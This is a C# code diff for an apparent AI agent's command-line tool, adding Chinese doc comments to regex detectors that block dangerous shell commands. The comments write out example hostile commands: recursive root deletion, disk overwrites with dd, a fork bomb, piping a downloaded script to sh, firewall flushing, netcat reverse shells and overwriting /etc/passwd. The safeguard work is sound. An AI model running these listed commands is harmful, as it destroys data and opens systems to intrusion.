@@ -5,6 +5,7 @@ using System.Text.RegularExpressions;
 using ManInBlack.AI.Core;
 using ManInBlack.AI.Core.Attributes;
 using ManInBlack.AI.Core.Middleware;
+using ManInBlack.AI.Core.Storage;
 using ManInBlack.AI.Services.Abstraction;
 using ManInBlack.AI.ToolCallFilters;
 
@@ -31,43 +32,7 @@ public partial class CommandLineTools(IUserStorage userStorage, AgentContext age
             "bash.exe");
         return File.Exists(gitBash) ? gitBash : "bash";
     }
-
-    // /// <summary>
-    // /// Run a PowerShell command and return its output.
-    // /// </summary>
-    // /// <param name="command">The PowerShell command to execute</param>
-    // /// <returns>The output of the executed command</returns>
-    // [AiTool]
-    // [AiTool.HasFilter<LoggingFilter, BroadCastingFilter>]
-    // public string RunPowershell(string command)
-    // {
-    //     Directory.CreateDirectory(workspace.WorkingDirectory);
-    //     var processInfo = new ProcessStartInfo
-    //     {
-    //         FileName               = "pwsh",
-    //         WorkingDirectory       = workspace.WorkingDirectory,
-    //         RedirectStandardOutput = true,
-    //         RedirectStandardError  = true,
-    //         StandardOutputEncoding = Encoding.UTF8,
-    //         StandardErrorEncoding  = Encoding.UTF8,
-    //         UseShellExecute        = false,
-    //         CreateNoWindow         = true,
-    //     };
-    //     processInfo.ArgumentList.Add("-Command");
-    //     processInfo.ArgumentList.Add($"[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; {command}");
-    //     using var process = Process.Start(processInfo);
-    //     if (process == null)
-    //         return "Failed to start PowerShell process.";
-    //
-    //     var output = process.StandardOutput.ReadToEnd();
-    //     var error  = process.StandardError.ReadToEnd();
-    //     process.WaitForExit();
-    //
-    //     return !string.IsNullOrEmpty(error)
-    //         ? $"PowerShell error: {error.Trim()}"
-    //         : output.Trim();
-    // }
-
+    
     /// <summary>
     /// ---
     /// Executes a given bash command and returns its output.
@@ -266,37 +231,70 @@ public partial class CommandLineTools(IUserStorage userStorage, AgentContext age
         return null;
     }
 
+    /// <summary>
+    /// 匹配递归强制删除根目录或家目录的命令，如 <c>rm -rf /</c>、<c>rm -rf /*</c>、<c>rm --force ~</c>、<c>rm -rf $HOME</c>。
+    /// </summary>
     [GeneratedRegex(@"rm\s+(?:-[a-zA-Z]*f[a-zA-Z]*\s+|--force\s+)(?:/\s*$|/\*|~|\$HOME)", RegexOptions.IgnoreCase,
         "zh-CN")]
     private static partial Regex RecursiveDeleteRootOrHomeDirRegex();
 
+    /// <summary>
+    /// 匹配格式化文件系统的命令，如 <c>mkfs.ext4 /dev/sda1</c>。
+    /// </summary>
     [GeneratedRegex(@"\bmkfs\b", RegexOptions.IgnoreCase, "zh-CN")]
     private static partial Regex FormatFileSystemRegex();
 
+    /// <summary>
+    /// 匹配使用 <c>dd</c> 直接写入块设备的命令，如 <c>dd if=/dev/zero of=/dev/sda</c>。
+    /// </summary>
     [GeneratedRegex(@"\bdd\s+.*of=/dev/", RegexOptions.IgnoreCase, "zh-CN")]
     private static partial Regex DdOverwriteBlockDeviceRegex();
 
+    /// <summary>
+    /// 匹配 Bash fork 炸弹，如 <c>:(){ :|:&amp; }</c>。
+    /// </summary>
     [GeneratedRegex(@":\(\)\{.*:\|:&")]
     private static partial Regex ForkBombRegex();
 
+    /// <summary>
+    /// 匹配关机、重启相关命令，如 <c>shutdown</c>、<c>reboot</c>、<c>poweroff</c>、<c>halt</c>、<c>init 0</c>、<c>init 6</c>。
+    /// </summary>
     [GeneratedRegex(@"\b(shutdown|reboot|poweroff|halt|init\s+[06])\b", RegexOptions.IgnoreCase, "zh-CN")]
     private static partial Regex ShutdownRegex();
 
+    /// <summary>
+    /// 匹配从网络下载并直接执行脚本的管道命令，如 <c>curl http://example.com/script.sh | sh</c>。
+    /// </summary>
     [GeneratedRegex(@"(wget|curl)\s+.*\|\s*(ba)?sh", RegexOptions.IgnoreCase, "zh-CN")]
     private static partial Regex PipeRemoteScriptRegex();
 
+    /// <summary>
+    /// 匹配通过输出重定向覆盖块设备的命令，如 <c>&gt; /dev/sda</c>。
+    /// </summary>
     [GeneratedRegex(@">\s*/dev/[sh]d", RegexOptions.IgnoreCase, "zh-CN")]
     private static partial Regex RedirectOverwriteBlockDeviceRegex();
 
+    /// <summary>
+    /// 匹配清空防火墙规则的命令，如 <c>iptables -F</c>。
+    /// </summary>
     [GeneratedRegex(@"\biptables\s+-F\b", RegexOptions.IgnoreCase, "zh-CN")]
     private static partial Regex FlushFirewallRegex();
 
+    /// <summary>
+    /// 匹配反向 Shell 或网络监听命令，如 <c>nc -l</c>、<c>nc -e</c>、<c>/dev/tcp/</c>。
+    /// </summary>
     [GeneratedRegex(@"\bnc\s+.*-[el]\b|/dev/tcp/", RegexOptions.IgnoreCase, "zh-CN")]
     private static partial Regex ReverseShellNetworkListener();
 
+    /// <summary>
+    /// 匹配覆写关键系统文件的命令，如 <c>&gt; /etc/passwd</c>、<c>&gt; /etc/shadow</c>、<c>&gt; /etc/sudoers</c>。
+    /// </summary>
     [GeneratedRegex(@">\s*/etc/(passwd|shadow|sudoers)\b", RegexOptions.IgnoreCase, "zh-CN")]
     private static partial Regex OverwriteCriticalSystemFilesRegex();
 
+    /// <summary>
+    /// 匹配创建或修改 Linux 用户的命令，如 <c>useradd</c>、<c>adduser</c>、<c>passwd</c>。
+    /// </summary>
     [GeneratedRegex(@"\b(useradd|adduser|passwd)\b", RegexOptions.IgnoreCase, "zh-CN")]
     private static partial Regex CreateLinuxUserRegex();
 }
